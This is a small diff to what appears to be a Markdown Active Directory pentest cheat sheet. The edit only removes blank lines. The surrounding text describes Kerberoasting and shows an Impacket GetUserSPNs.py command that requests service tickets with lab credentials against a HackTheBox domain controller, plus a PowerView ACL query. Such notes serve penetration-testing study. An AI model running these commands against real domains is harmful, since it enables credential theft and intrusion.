@@ -44,9 +44,7 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
 
 **Requires:** Domain Credentials
-
 **Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets
-
 `GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`
 
 ## Active Directory Tools
